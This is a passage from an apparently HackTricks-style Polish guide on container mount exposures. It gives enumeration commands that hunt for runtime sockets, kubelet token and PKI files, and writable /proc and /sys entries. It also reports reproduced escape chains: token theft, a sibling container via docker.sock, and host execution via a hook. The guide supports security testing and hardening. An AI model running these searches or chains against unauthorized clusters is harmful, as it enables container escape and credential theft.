## Kontrole

Użyj tych poleceń, aby szybko znaleźć narażenia związane z montowaniami o najwyższym potencjale:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Co jest tu interesujące:

- Host root, `/proc`, `/sys`, `/var` i sockety runtime to ustalenia o najwyższym priorytecie.
- Zapisywalne wpisy w proc/sys często oznaczają, że mount udostępnia globalne dla hosta mechanizmy kontroli jądra, a nie bezpieczny widok kontenera.
- Ścieżki `/var` zamontowane w kontenerze wymagają sprawdzenia danych uwierzytelniających i sąsiednich obciążeń, a nie tylko przeglądu systemu plików.
- Katalogi stanu Kubeleta oraz ścieżki CNI/pluginów zasługują na taki sam priorytet jak sockety runtime, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji danych uwierzytelniających w węźle.

## Status lokalnej walidacji

Opisane na tej stronie praktyczne łańcuchy zostały sprawdzone na lokalnym węźle Linux minikube. Walidacja odtworzyła:

- dostęp do odczytu i zapisu przez tymczasowy, zapisywalny hostPath
- wykrycie tokenów ServiceAccount udostępnionych podom oraz zamontowanych Secrets przez `/var/lib/kubelet/pods`
- pomyślne uwierzytelnienie w Kubernetes API przy użyciu aktywnego tokena odzyskanego z zamontowanego stanu Kubeleta
- wykrycie tylko do odczytu sąsiedniego systemu plików Docker `overlay2` przez zamontowany `/var`
- utworzenie przez Docker API kontenera równorzędnego z montowaniem hosta tylko do odczytu za pośrednictwem zamontowanego `docker.sock`
- opóźnione wykonanie na hoście za pośrednictwem tymczasowego hooka obsługiwanego przez hosta
- symulację wrappera CNI, która zachowała argumenty, standardowe wejście i wykonanie oryginalnego pluginu

Ten sam węzeł udostępniał `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ale nie udostępniał `uevent_helper`, zmiennych EFI, wpisów termicznych ani `sched_debug`. Nie uruchamiano destrukcyjnych mechanizmów wyzwalających w jądrze. Potwierdza to, że łańcuchy wykorzystujące host root, `/var`, stan Kubeleta, sockety i mechanizmy obsługiwane przez hosta można odtworzyć, natomiast techniki wykorzystujące mechanizmy pomocnicze procfs/sysfs należy traktować jako zależne od konkretnego jądra, trybu montowania, ścieżki payloadu i wyzwalacza.

## References

- [1] [Lokalne pliki i ścieżki używane przez Kubeleta](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontener cilium-agent może uzyskać dostęp do hosta przez montowanie `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
